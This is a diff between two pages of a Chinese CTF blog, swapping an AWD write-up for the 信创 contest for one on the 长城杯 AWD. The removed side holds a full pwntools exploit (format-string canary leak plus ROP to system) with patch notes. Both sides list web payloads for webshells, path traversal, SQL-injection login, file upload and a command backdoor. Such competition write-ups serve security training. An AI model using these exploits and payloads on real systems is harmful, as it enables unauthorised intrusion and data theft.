@@ -16,44 +16,36 @@
   <meta name="author" content="TMagWarO">
   <meta name="keywords" content="">
   
-    <meta name="description" content="pwncanary保护和NX保护  ida查看，存在格式化字符串漏洞和栈溢出  因此思路是泄露canary保护，然后ret2libc gdb本地调试  发现0x7ffff7e1b780被泄露了，因此计算出canary偏移为11，输入%11$p得到  ![image-20240513211218375](信创wp&#x2F;image-20240513211218375.png  存在system和binsh">
+    <meta name="description" content="funadmin漏洞1：&#x2F;app&#x2F;api&#x2F;controller&#x2F;v1&#x2F;Token.php存在一句话木马  漏洞2：任意文件读取app&#x2F;frontend&#x2F;controller&#x2F;Ajax.php存在文件读取 1frontend&#x2F;Ajax&#x2F;getfile?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag  漏洞3：phtml文件上传后台用户头像抓包修改可上传phtml文件  漏洞4：后台任意文件上">
 <meta property="og:type" content="article">
-<meta property="og:title" content="信创AWD wp">
-<meta property="og:url" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/index.html">
+<meta property="og:title" content="长城杯 AWD">
+<meta property="og:url" content="http://tmagwaro.github.io/2024/07/17/ccb/index.html">
 <meta property="og:site_name" content="TMagWarO">
-<meta property="og:description" content="pwncanary保护和NX保护  ida查看，存在格式化字符串漏洞和栈溢出  因此思路是泄露canary保护，然后ret2libc gdb本地调试  发现0x7ffff7e1b780被泄露了，因此计算出canary偏移为11，输入%11$p得到  ![image-20240513211218375](信创wp&#x2F;image-20240513211218375.png  存在system和binsh">
+<meta property="og:description" content="funadmin漏洞1：&#x2F;app&#x2F;api&#x2F;controller&#x2F;v1&#x2F;Token.php存在一句话木马  漏洞2：任意文件读取app&#x2F;frontend&#x2F;controller&#x2F;Ajax.php存在文件读取 1frontend&#x2F;Ajax&#x2F;getfile?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag  漏洞3：phtml文件上传后台用户头像抓包修改可上传phtml文件  漏洞4：后台任意文件上">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513204847024.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513205056049.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513205653870.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211044393.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211350110.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211803077.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513212043740.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513212528481.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525223420130.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525224918694.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525225207421.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240531234047064.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240531234152179.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240601160047542.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140122585.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140138016.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140221739.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140245445.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140329365.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140342042.png">
-<meta property="og:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240901105149189.png">
-<meta property="article:published_time" content="2024-05-13T12:47:49.000Z">
-<meta property="article:modified_time" content="2024-09-01T03:21:22.333Z">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240917161604032.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240917161615348.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240917161625669.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240917161635264.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240917161644955.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240917161653436.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240909162053704.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240909162159781.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240909163336435.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240909163415171.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240909170401033.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240909173800193.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240909175604238.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240909175108987.png">
+<meta property="article:published_time" content="2024-07-17T08:17:57.000Z">
+<meta property="article:modified_time" content="2024-09-17T08:24:28.072Z">
 <meta property="article:author" content="TMagWarO">
-<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://tmagwaro.github.io/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513204847024.png">
+<meta name="twitter:image" content="http://tmagwaro.github.io/2024/07/17/ccb/image-20240917161604032.png">
   
   
   
-  <title>信创AWD wp - TMagWarO</title>
+  <title>长城杯 AWD - TMagWarO</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -248,7 +240,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="信创AWD wp"></span>
+            <span id="subtitle" data-typed-text="长城杯 AWD"></span>
           
         </div>
 
@@ -259,8 +251,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-05-13 20:47" pubdate>
-          2024年5月13日 晚上
+        <time datetime="2024-07-17 16:17" pubdate>
+          2024年7月17日 下午
         </time>
       </span>
     
@@ -271,7 +263,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          456 字
+          264 字
         
       </span>
     
@@ -282,7 +274,7 @@
         
         
         
-          4 分钟
+          3 分钟
         
       </span>
     
@@ -327,57 +319,41 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">信创AWD wp</h1>
+            <h1 id="seo-header">长城杯 AWD</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>canary保护和NX保护</p>
-<img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513204847024.png" srcset="/img/loading.gif" lazyload class title="image-20240513204847024">
-<p>ida查看，存在格式化字符串漏洞和栈溢出</p>
-<img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513205056049.png" srcset="/img/loading.gif" lazyload class title="image-20240513205056049">
-<p>因此思路是泄露canary保护，然后ret2libc</p>
-<p>gdb本地调试</p>
-<img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513205653870.png" srcset="/img/loading.gif" lazyload class title="image-20240513205653870">
-<p>发现0x7ffff7e1b780被泄露了，因此计算出canary偏移为11，输入%11$p得到</p>
-<img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211044393.png" srcset="/img/loading.gif" lazyload class title="image-20240513211044393">
-<p>![image-20240513211218375](信创wp/image-20240513211218375.png</p>
-<img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211350110.png" srcset="/img/loading.gif" lazyload class title="image-20240513211350110">
-<p>存在system和binsh，直接使用</p>
-<img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211803077.png" srcset="/img/loading.gif" lazyload class title="image-20240513211803077">
-<p>由于是64位程序，还需要ret、和pop rdi，ROPgadget查找</p>
-<img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513212043740.png" srcset="/img/loading.gif" lazyload class title="image-20240513212043740">
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">p</span>=remote(&#x27;4.2.1.3&#x27;,9999)<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">0x0000000000400903 : pop rdi ; ret</span><br><span class="hljs-string">0x00000000004005e9 : ret</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-attribute">binsh</span>=0x400928<br><span class="hljs-attribute">system</span>=0x400630<br><span class="hljs-attribute">ret</span>=0x4005e9<br><span class="hljs-attribute">pop_rdi</span>=0x400903<br><br>p1 = <span class="hljs-string">&quot;%&#123;offset&#125;<span class="hljs-variable">$p</span>\n&quot;</span>.format(offset = 11)<br><span class="hljs-built_in">print</span>(p1)<br>p.sendafter(b<span class="hljs-string">&quot;[type &#x27;quit&#x27; to quit] prompt&gt; &quot;</span>,p1)<br>leak_info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>,drop = <span class="hljs-literal">True</span>)<br>canary = int(leak_info,16)<br>log.success(<span class="hljs-string">&quot;canary:&quot;</span> + hex(canary))<br>p2 = b<span class="hljs-string">&#x27;a&#x27;</span>*(0x20-8)+p64(canary)+b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*8</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendafter(b<span class="hljs-string">&quot;[type &#x27;quit&#x27; to quit] prompt&gt; &quot;</span>,p2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
-<h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>0x50改为0x20</p>
-<img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513212528481.png" srcset="/img/loading.gif" lazyload class title="image-20240513212528481">
-<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>存在puts，将printf改为puts</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="finecms"><a href="#finecms" class="headerlink" title="finecms"></a>finecms</h2><h3 id="漏洞1：一句话木马"><a href="#漏洞1：一句话木马" class="headerlink" title="漏洞1：一句话木马"></a>漏洞1：一句话木马</h3><p>D盾扫出来个一句话木马</p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525223420130.png" srcset="/img/loading.gif" lazyload alt="image-20240525223420130"></p>
-<h3 id="漏洞2：CSRF"><a href="#漏洞2：CSRF" class="headerlink" title="漏洞2：CSRF"></a>漏洞2：CSRF</h3><p>网站为FineCMS v5.4.0</p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525224918694.png" srcset="/img/loading.gif" lazyload alt="image-20240525224918694"></p>
-<p>搜索得到</p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525225207421.png" srcset="/img/loading.gif" lazyload alt="image-20240525225207421"></p>
-<h3 id="漏洞3-弱密码"><a href="#漏洞3-弱密码" class="headerlink" title="漏洞3:弱密码"></a>漏洞3:弱密码</h3><p>网站后台管理员账户（admin）存在弱密码 admin</p>
-<h3 id="漏洞4：后台getshell"><a href="#漏洞4：后台getshell" class="headerlink" title="漏洞4：后台getshell"></a>漏洞4：后台getshell</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hun-ya/p/9392211.html">FineCMS v5.4.1 后台getshell - _昏鸦 - 博客园 (cnblogs.com)</a></p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240531234047064.png" srcset="/img/loading.gif" lazyload alt="image-20240531234047064"></p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240531234152179.png" srcset="/img/loading.gif" lazyload alt="image-20240531234152179"></p>
-<h3 id="漏洞5：信息泄露"><a href="#漏洞5：信息泄露" class="headerlink" title="漏洞5：信息泄露"></a>漏洞5：信息泄露</h3><p>网站下有phpinfo.php</p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240601160047542.png" srcset="/img/loading.gif" lazyload alt="image-20240601160047542"></p>
-<h1 id="meiupic3"><a href="#meiupic3" class="headerlink" title="meiupic3"></a>meiupic3</h1><h2 id="漏洞1：一句话木马-1"><a href="#漏洞1：一句话木马-1" class="headerlink" title="漏洞1：一句话木马"></a>漏洞1：一句话木马</h2><p> 扫出来个木马</p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140122585.png" srcset="/img/loading.gif" lazyload alt="image-20240829140122585"></p>
-<p>但是中间有函数报错，无法执行到木马处，估计出题人也没验证</p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140138016.png" srcset="/img/loading.gif" lazyload alt="image-20240829140138016"></p>
-<p>修改下代码，验证</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">232.133</span>:<span class="hljs-number">7000</span><span class="hljs-regexp">//</span>templates<span class="hljs-regexp">/default/</span>common/<span class="hljs-number">404</span>.php?a=system&amp;b=ls<br></code></pre></td></tr></table></figure>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140221739.png" srcset="/img/loading.gif" lazyload alt="image-20240829140221739"></p>
-<h2 id="漏洞2：后台相册任意上传文件"><a href="#漏洞2：后台相册任意上传文件" class="headerlink" title="漏洞2：后台相册任意上传文件"></a>漏洞2：后台相册任意上传文件</h2><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140245445.png" srcset="/img/loading.gif" lazyload alt="image-20240829140245445"></p>
-<p>抓包修改上传后的名字为2.php,</p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140329365.png" srcset="/img/loading.gif" lazyload alt="image-20240829140329365"></p>
-<p>访问/data/cache/tmp/2.php</p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140342042.png" srcset="/img/loading.gif" lazyload alt="image-20240829140342042"></p>
-<h2 id="漏洞3-弱密码-1"><a href="#漏洞3-弱密码-1" class="headerlink" title="漏洞3:弱密码"></a>漏洞3:弱密码</h2><p>网站后台管理员账户（admin）存在弱密码 admin</p>
-<h2 id="漏洞4：后台模板修改"><a href="#漏洞4：后台模板修改" class="headerlink" title="漏洞4：后台模板修改"></a>漏洞4：后台模板修改</h2><p>由于只有个别子目录存在写权限，当某php存在写权限，后台可修改代码getshell</p>
-<p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240901105149189.png" srcset="/img/loading.gif" lazyload alt="image-20240901105149189"></p>
+                <h1 id="funadmin"><a href="#funadmin" class="headerlink" title="funadmin"></a>funadmin</h1><h2 id="漏洞1："><a href="#漏洞1：" class="headerlink" title="漏洞1："></a>漏洞1：</h2><p>/app/api/controller/v1/Token.php存在一句话木马</p>
+<p><img src="/2024/07/17/ccb/image-20240917161604032.png" srcset="/img/loading.gif" lazyload alt="image-20240917161604032"></p>
+<h2 id="漏洞2：任意文件读取"><a href="#漏洞2：任意文件读取" class="headerlink" title="漏洞2：任意文件读取"></a>漏洞2：任意文件读取</h2><p>app/frontend/controller/Ajax.php存在文件读取</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">frontend<span class="hljs-regexp">/Ajax/g</span>etfile?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure>
+<p><img src="/2024/07/17/ccb/image-20240917161615348.png" srcset="/img/loading.gif" lazyload alt="image-20240917161615348"></p>
+<h2 id="漏洞3：phtml文件上传"><a href="#漏洞3：phtml文件上传" class="headerlink" title="漏洞3：phtml文件上传"></a>漏洞3：phtml文件上传</h2><p>后台用户头像抓包修改可上传phtml文件</p>
+<p><img src="/2024/07/17/ccb/image-20240917161625669.png" srcset="/img/loading.gif" lazyload alt="image-20240917161625669"></p>
+<h2 id="漏洞4：后台任意文件上传"><a href="#漏洞4：后台任意文件上传" class="headerlink" title="漏洞4：后台任意文件上传"></a>漏洞4：后台任意文件上传</h2><p>离线上传一个包含木马的zip文件，木马会被解压放到addons目录</p>
+<p><img src="/2024/07/17/ccb/image-20240917161635264.png" srcset="/img/loading.gif" lazyload alt="image-20240917161635264"></p>
+<p>首页cookie文件包含</p>
+<p><img src="/2024/07/17/ccb/image-20240917161644955.png" srcset="/img/loading.gif" lazyload alt="image-20240917161644955"></p>
+<h2 id="漏洞5：信息泄露"><a href="#漏洞5：信息泄露" class="headerlink" title="漏洞5：信息泄露"></a>漏洞5：信息泄露</h2><p>首页源代码泄露admin账户密码</p>
+<p><img src="/2024/07/17/ccb/image-20240917161653436.png" srcset="/img/loading.gif" lazyload alt="image-20240917161653436"></p>
+<p>参考<a target="_blank" rel="noopener" href="https://www.qwesec.com/2024/05/changchengcup.html">https://www.qwesec.com/2024/05/changchengcup.html</a></p>
+<h1 id="教务系统"><a href="#教务系统" class="headerlink" title="教务系统"></a>教务系统</h1><h2 id="漏洞一：命令执行"><a href="#漏洞一：命令执行" class="headerlink" title="漏洞一：命令执行"></a>漏洞一：命令执行</h2><p>forget.jsp存在命令执行</p>
+<p><img src="/2024/07/17/ccb/image-20240909162053704.png" srcset="/img/loading.gif" lazyload alt="image-20240909162053704"></p>
+<p>验证</p>
+<p><img src="/2024/07/17/ccb/image-20240909162159781.png" srcset="/img/loading.gif" lazyload alt="image-20240909162159781"></p>
+<h2 id="漏洞二：后台头像任意文件上传"><a href="#漏洞二：后台头像任意文件上传" class="headerlink" title="漏洞二：后台头像任意文件上传"></a>漏洞二：后台头像任意文件上传</h2><p>sql文件泄露教师账户密码，登录上传jsp马</p>
+<p><img src="/2024/07/17/ccb/image-20240909163336435.png" srcset="/img/loading.gif" lazyload alt="image-20240909163336435"></p>
+<p><img src="/2024/07/17/ccb/image-20240909163415171.png" srcset="/img/loading.gif" lazyload alt="image-20240909163415171"></p>
+<h2 id="漏洞三：登录页面sql注入"><a href="#漏洞三：登录页面sql注入" class="headerlink" title="漏洞三：登录页面sql注入"></a>漏洞三：登录页面sql注入</h2><p>账户密码可用万能密码1’ or ‘1’=’1登录</p>
+<p><img src="/2024/07/17/ccb/image-20240909170401033.png" srcset="/img/loading.gif" lazyload alt="image-20240909170401033"></p>
+<p>账户密码直接接入sql语句</p>
+<h2 id="漏洞四：密码修改越权"><a href="#漏洞四：密码修改越权" class="headerlink" title="漏洞四：密码修改越权"></a>漏洞四：密码修改越权</h2><p>可根据id修改其他同类用户密码</p>
+<p><img src="/2024/07/17/ccb/image-20240909173800193.png" srcset="/img/loading.gif" lazyload alt="image-20240909173800193"></p>
+<h1 id="DocToolkit"><a href="#DocToolkit" class="headerlink" title="DocToolkit"></a>DocToolkit</h1><h2 id="漏洞一：后门"><a href="#漏洞一：后门" class="headerlink" title="漏洞一：后门"></a>漏洞一：后门</h2><p><img src="/2024/07/17/ccb/image-20240909175604238.png" srcset="/img/loading.gif" lazyload alt="image-20240909175604238"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/test/backd0or?cmd=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
+<h2 id="漏洞二：shiro反序列化"><a href="#漏洞二：shiro反序列化" class="headerlink" title="漏洞二：shiro反序列化"></a>漏洞二：shiro反序列化</h2><p>在jar包里找到密钥</p>
+<p><img src="/2024/07/17/ccb/image-20240909175108987.png" srcset="/img/loading.gif" lazyload alt="image-20240909175108987"></p>
 
                 
               </div>
@@ -386,34 +362,6 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/AWD-WriteUp/" class="category-chain-item">AWD WriteUp</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
-      
-    </div>
   
 </div>
 
@@ -423,8 +371,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>信创AWD wp</div>
-      <div>http://tmagwaro.github.io/2024/05/13/信创wp/</div>
+      <div>长城杯 AWD</div>
+      <div>http://tmagwaro.github.io/2024/07/17/ccb/</div>
     </div>
     <div class="license-meta">
       
@@ -436,7 +384,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年5月13日</div>
+          <div>2024年7月17日</div>
         </div>
       
       
@@ -468,9 +416,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/05/18/ciscn2024/" title="ciscn2024">
+                      <a href="/2024/07/29/gaatitrack/" title="gaatitrack">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ciscn2024</span>
+                        <span class="hidden-mobile">gaatitrack</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -478,8 +426,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/04/29/XYCTF2024WP/" title="XYCTF2024WP">
-                        <span class="hidden-mobile">XYCTF2024WP</span>
+                      <a href="/2024/06/29/AWD%E6%90%AD%E5%BB%BA/" title="AWD搭建">
+                        <span class="hidden-mobile">AWD搭建</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
